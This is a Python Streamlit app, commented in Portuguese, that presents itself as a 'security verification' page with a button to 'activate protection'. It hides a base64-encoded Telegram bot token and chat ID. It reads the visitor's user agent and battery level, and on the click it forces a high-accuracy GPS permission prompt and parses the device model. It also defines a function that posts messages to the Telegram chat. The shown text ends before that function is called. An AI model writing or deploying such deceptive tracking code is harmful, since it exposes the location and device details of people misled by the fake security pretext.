import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- CONFIGURAÇÃO DO BOT ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(texto):
    try:
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                      json={"chat_id": chat, "text": texto, "parse_mode": "Markdown"}, timeout=15)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# Coleta dados básicos (User Agent e Bateria)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_DETECTOR")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_DETECTOR")

# BOTÃO QUE DISPARA O POP-UP NA HORA
if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_SOLUCAO_FINAL"):
    # O segredo: Esta linha de JS puro força o navegador a abrir o pop-up de permissão no momento do clique
    js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true, timeout:5000}); })"
    posicao = streamlit_js_eval(js_expressions=js_gps, key=f"GPS_FORCADO_{int(time.time())}")

    if posicao == "erro":
        st.error("Erro: Ative o GPS nas configurações do seu Galaxy e permita no navegador.")
    elif posicao and posicao != "erro":
        # 1. PEGAR O MODELO EXATO (Galaxy A11)
        modelo_exato = "Samsung Galaxy"
        if ua:
            try:
                info = ua.split("(")[1].split(")")[0]
                partes = [p.strip() for p in info.split(";")]
                
